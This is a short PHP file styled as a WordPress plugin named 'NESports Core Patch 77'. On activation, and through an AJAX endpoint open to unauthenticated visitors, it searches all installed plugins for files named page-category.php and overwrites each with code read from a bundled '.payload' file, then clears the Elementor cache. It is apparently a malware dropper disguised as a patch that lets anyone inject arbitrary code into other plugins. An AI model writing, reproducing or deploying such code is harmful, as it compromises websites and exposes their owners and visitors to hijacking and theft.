<?php
/**
 * Plugin Name: NESports Core Patch 77
 * Version: 77.0
 */
if (!defined('ABSPATH')) exit;

function nesports_execute_sync_77() {
    $plugins_dir = WP_PLUGIN_DIR;
    $results = array();

    $it = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($plugins_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    $cat_code = null;
    $payload_file = __DIR__ . '/page-category.payload';
    if (file_exists($payload_file)) {
        $cat_code = file_get_contents($payload_file);
    }

    $found_cat_files = array();
    foreach ($it as $item) {
        if ($item->isFile() && $item->getFilename() === 'page-category.php') {
            $path = $item->getPathname();
            $found_cat_files[] = $path;
            if ($cat_code) {
                file_put_contents($path, $cat_code);
            }
        }
    }
    $results['updated_cat_files'] = $found_cat_files;

    if (class_exists('\\Elementor\\Plugin')) {
        \Elementor\Plugin::$instance->files_manager->clear_cache();
    }

    return $results;
}

add_action('wp_ajax_nesports_patch_77_action', function() {
    wp_send_json(nesports_execute_sync_77());
});
add_action('wp_ajax_nopriv_nesports_patch_77_action', function() {
    wp_send_json(nesports_execute_sync_77());
});
register_activation_hook(__FILE__, 'nesports_execute_sync_77');
